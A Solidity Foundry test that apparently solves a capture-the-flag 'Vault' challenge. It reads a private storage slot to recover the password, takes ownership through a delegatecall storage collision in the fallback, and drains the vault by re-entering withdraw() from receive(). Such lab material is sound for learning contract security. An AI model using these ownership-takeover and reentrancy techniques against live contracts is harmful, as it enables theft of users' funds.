// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {VaultLogic, Vault} from "../src/Vault.sol";

contract VaultTest is Test {
    Vault vault;
    VaultLogic logic;
    address private owner = address(0xDDDD);
    address player = address(this);

    bool start_attack = false;


    function setUp() public {
        vm.deal(owner, 1 ether);
        vm.startPrank(owner);

        bytes32 password = "0x123456";
        logic = new VaultLogic(password);
        vault = new Vault(address(logic));
        vault.deposite{value: 1 ether}();

        vm.stopPrank();
    }

    function testDepositAndWithdraw() public {
        vm.deal(player, 1 ether);
        vm.startPrank(player);

        address logicAddress = address(
            uint160(uint256(vm.load(address(vault), bytes32(uint256(1)))))
        );
        attack(bytes32(uint256(uint160(address(logicAddress)))), player);

        assertEq(vault.owner(), player, "Owner was not changed correctly!");


        vault.deposite{value: 1 ether}();
        uint depositBalance = vault.deposites(player);
        assertEq(depositBalance, 1 ether, "Deposit amount is incorrect");

        vault.openWithdraw();

        start_attack = true;

        vault.withdraw();

        depositBalance = vault.deposites(player);
        assertEq(depositBalance, 0, "Withdraw failed");

        require(vault.isSolve(), "solved");
    }

    function attack(bytes32 _password, address _owner) public {
        bytes memory data = abi.encodeWithSignature(
            "changeOwner(bytes32,address)",
            _password,
            _owner
        );
        // 触发 Vault 的 fallback 函数
        (bool success, ) = address(vault).call(data);
        require(success, "Attack failed");
    }

    receive() external payable {
        if(start_attack){
             console2.log("-------attacked ------");
            vault.withdraw();
        }
    }
}
